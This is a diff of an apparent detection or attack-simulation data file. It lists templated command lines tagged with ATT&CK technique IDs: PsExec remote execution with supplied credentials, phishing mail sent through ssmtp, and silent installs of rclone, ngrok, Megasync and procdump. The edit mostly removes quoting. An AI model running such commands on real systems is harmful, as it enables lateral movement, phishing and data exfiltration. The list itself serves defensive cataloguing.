@@ -1,150 +1,150 @@
 # T1078 Valid Accounts
 T1078 psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-T1078 cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-T1078 powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+T1078 cmd /c psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1078 powershell -c psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
 T1078 psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-T1078 cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-T1078 powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+T1078 cmd /c psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1078 powershell -c psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
 T1078 psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-T1078 cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-T1078 powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+T1078 cmd /c psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1078 powershell -c psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
 T1078 psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-T1078 cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-T1078 powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+T1078 cmd /c psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1078 powershell -c psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
 T1078 psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-T1078 cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-T1078 powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+T1078 cmd /c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1078 powershell -c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
 T1078 psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-T1078 cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-T1078 powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+T1078 cmd /c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1078 powershell -c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
 T1078 psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-T1078 cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-T1078 powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+T1078 cmd /c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1078 powershell -c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
 T1078 psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-T1078 cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-T1078 powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+T1078 cmd /c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1078 powershell -c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
 T1078 psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-T1078 cmd /c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-T1078 powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+T1078 cmd /c psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1078 powershell -c psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
 T1078 psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-T1078 cmd /c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-T1078 powershell -c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+T1078 cmd /c psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1078 powershell -c psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
 T1078 psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-T1078 cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-T1078 powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+T1078 cmd /c psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1078 powershell -c psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
 T1078 psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-T1078 cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-T1078 powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+T1078 cmd /c psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1078 powershell -c psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
 T1078 psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-T1078 cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-T1078 powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+T1078 cmd /c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1078 powershell -c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
 T1078 psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-T1078 cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-T1078 powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+T1078 cmd /c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1078 powershell -c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
 T1078 psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-T1078 cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-T1078 powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+T1078 cmd /c psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1078 powershell -c psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
 T1078 psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-T1078 cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-T1078 powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+T1078 cmd /c psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1078 powershell -c psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
 T1078 psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-T1078 cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-T1078 powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+T1078 cmd /c psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1078 powershell -c psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
 T1078 psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-T1078 cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-T1078 powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+T1078 cmd /c psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1078 powershell -c psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
 T1078 psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-T1078 cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-T1078 powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+T1078 cmd /c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1078 powershell -c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
 T1078 psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-T1078 cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-T1078 powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+T1078 cmd /c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1078 powershell -c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
 T1078 psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-T1078 cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-T1078 powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+T1078 cmd /c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1078 powershell -c psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
 T1078 psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-T1078 cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-T1078 powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+T1078 cmd /c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1078 powershell -c psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
 T1078 psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
-T1078 cmd /c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
-T1078 powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+T1078 cmd /c psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+T1078 powershell -c psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
 T1078 psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
-T1078 cmd /c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
-T1078 powershell -c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+T1078 cmd /c psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+T1078 powershell -c psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
 
 # T1133 External Remote Services
 T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-T1133 cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-T1133 powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
 T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
-T1133 cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
 T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-T1133 cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-T1133 powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
 T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-T1133 cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
 T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-T1133 cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-T1133 powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
 T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-T1133 cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
 T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-T1133 cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-T1133 powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
 T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-T1133 cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
 T1133 Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-T1133 cmd /c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-T1133 powershell -c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+T1133 cmd /c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1133 powershell -c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
 T1133 Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-T1133 cmd /c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+T1133 cmd /c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+T1133 powershell -c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
 T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-T1133 cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-T1133 powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
 T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-T1133 cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
 T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-T1133 cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-T1133 powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
 T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-T1133 cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
 T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-T1133 cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-T1133 powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
 T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-T1133 cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
 T1133 Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-T1133 cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-T1133 powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+T1133 cmd /c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
 T1133 Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-T1133 cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+T1133 cmd /c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
 T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-T1133 cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-T1133 powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
 T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-T1133 cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
 T1133 Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-T1133 cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-T1133 powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+T1133 cmd /c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
 T1133 Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-T1133 cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+T1133 cmd /c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
 T1133 Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
-T1133 cmd /c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
-T1133 powershell -c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+T1133 cmd /c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+T1133 powershell -c Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
 T1133 Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
-T1133 cmd /c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
-T1133 powershell -c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+T1133 cmd /c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+T1133 powershell -c Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
 
 # T1189 Drive-by Compromise
 
@@ -203,10 +203,10 @@ T1566 ssmtp ${username}@${domain} < mail.txt
 T1566 ssmtp ${username}@${domain} < mail.txt 2> /dev/null
 T1566 ssmtp ${username}@${domain} < mail.txt 2> &1
 T1566 ssmtp ${username}@${domain} < mail.txt 2> error.log
-T1566 echo -e ${email_content} | ssmtp ${username}@${domain}
-T1566 echo -e ${email_content} | ssmtp ${username}@${domain} 2> /dev/null
-T1566 echo -e ${email_content} | ssmtp ${username}@${domain} 2> &1
-T1566 echo -e ${email_content} | ssmtp ${username}@${domain} 2> error.log
+T1566 echo ${email_content} | ssmtp ${username}@${domain}
+T1566 echo ${email_content} | ssmtp ${username}@${domain} 2> /dev/null
+T1566 echo ${email_content} | ssmtp ${username}@${domain} 2> &1
+T1566 echo ${email_content} | ssmtp ${username}@${domain} 2> error.log
 T1566 cat email.txt | ssmtp ${username}@${domain}
 T1566 cat email.txt | ssmtp ${username}@${domain} 2> /dev/null
 T1566 cat email.txt | ssmtp ${username}@${domain} 2> &1
@@ -226,225 +226,225 @@ T1566 cat email.txt | mailx -s ${email_subject} ${username}@${domain} 2> error.l
 
 # T1072 Software Deployment Tools
 T1072 choco install -y 7zip
-T1072 cmd /c "choco install -y 7zip"
-T1072 powershell -c "choco install -y 7zip"
+T1072 cmd /c choco install -y 7zip
+T1072 powershell -c choco install -y 7zip
 T1072 choco install 7zip
-T1072 cmd /c "choco install 7zip"
-T1072 powershell -c "choco install 7zip"
+T1072 cmd /c choco install 7zip
+T1072 powershell -c choco install 7zip
 T1072 choco install -f 7zip
-T1072 cmd /c "choco install -f 7zip"
-T1072 powershell -c "choco install -f 7zip"
+T1072 cmd /c choco install -f 7zip
+T1072 powershell -c choco install -f 7zip
 T1072 choco install -y putty
-T1072 cmd /c "choco install -y putty"
-T1072 powershell -c "choco install -y putty"
+T1072 cmd /c choco install -y putty
+T1072 powershell -c choco install -y putty
 T1072 choco install putty
-T1072 cmd /c "choco install putty"
-T1072 powershell -c "choco install putty"
+T1072 cmd /c choco install putty
+T1072 powershell -c choco install putty
 T1072 choco install -f putty
-T1072 cmd /c "choco install -f putty"
-T1072 powershell -c "choco install -f putty"
+T1072 cmd /c choco install -f putty
+T1072 powershell -c choco install -f putty
 T1072 choco install rclone
-T1072 cmd /c "choco install rclone"
-T1072 powershell -c "choco install rclone"
+T1072 cmd /c choco install rclone
+T1072 powershell -c choco install rclone
 T1072 choco install -y rclone
-T1072 cmd /c "choco install -y rclone"
-T1072 powershell -c "choco install -y rclone"
+T1072 cmd /c choco install -y rclone
+T1072 powershell -c choco install -y rclone
 T1072 choco install -f rclone
-T1072 cmd /c "choco install -f rclone"
-T1072 powershell -c "choco install -f rclone"
+T1072 cmd /c choco install -f rclone
+T1072 powershell -c choco install -f rclone
 T1072 choco install ngrok
-T1072 cmd /c "choco install ngrok"
-T1072 powershell -c "choco install ngrok"
+T1072 cmd /c choco install ngrok
+T1072 powershell -c choco install ngrok
 T1072 choco install -y ngrok
-T1072 cmd /c "choco install -y ngrok"
-T1072 powershell -c "choco install -y ngrok"
+T1072 cmd /c choco install -y ngrok
+T1072 powershell -c choco install -y ngrok
 T1072 choco install -f ngrok
-T1072 cmd /c "choco install -f ngrok"
-T1072 powershell -c "choco install -f ngrok"
+T1072 cmd /c choco install -f ngrok
+T1072 powershell -c choco install -f ngrok
 T1072 choco install psexec
-T1072 cmd /c "choco install psexec"
-T1072 powershell -c "choco install psexec"
+T1072 cmd /c choco install psexec
+T1072 powershell -c choco install psexec
 T1072 choco install -y psexec
-T1072 cmd /c "choco install -y psexec"
-T1072 powershell -c "choco install -y psexec"
+T1072 cmd /c choco install -y psexec
+T1072 powershell -c choco install -y psexec
 T1072 choco install -f psexec
-T1072 cmd /c "choco install -f psexec"
-T1072 powershell -c "choco install -f psexec"
+T1072 cmd /c choco install -f psexec
+T1072 powershell -c choco install -f psexec
 T1072 choco install procdump
-T1072 cmd /c "choco install procdump"
-T1072 powershell -c "choco install procdump"
+T1072 cmd /c choco install procdump
+T1072 powershell -c choco install procdump
 T1072 choco install -y procdump
-T1072 cmd /c "choco install -y procdump"
-T1072 powershell -c "choco install -y procdump"
+T1072 cmd /c choco install -y procdump
+T1072 powershell -c choco install -y procdump
 T1072 choco install -f procdump
-T1072 cmd /c "choco install -f procdump"
-T1072 powershell -c "choco install -f procdump"
+T1072 cmd /c choco install -f procdump
+T1072 powershell -c choco install -f procdump
 T1072 choco install Megasync
-T1072 cmd /c "choco install Megasync"
-T1072 powershell -c "choco install Megasync"
+T1072 cmd /c choco install Megasync
+T1072 powershell -c choco install Megasync
 T1072 choco install -y Megasync
-T1072 cmd /c "choco install -y Megasync"
-T1072 powershell -c "choco install -y Megasync"
+T1072 cmd /c choco install -y Megasync
+T1072 powershell -c choco install -y Megasync
 T1072 choco install -f Megasync
-T1072 cmd /c "choco install -f Megasync"
-T1072 powershell -c "choco install -f Megasync"
+T1072 cmd /c choco install -f Megasync
+T1072 powershell -c choco install -f Megasync
 T1072 choco install winscp
-T1072 cmd /c "choco install winscp"
-T1072 powershell -c "choco install winscp"
+T1072 cmd /c choco install winscp
+T1072 powershell -c choco install winscp
 T1072 choco install -y winscp
-T1072 cmd /c "choco install -y winscp"
-T1072 powershell -c "choco install -y winscp"
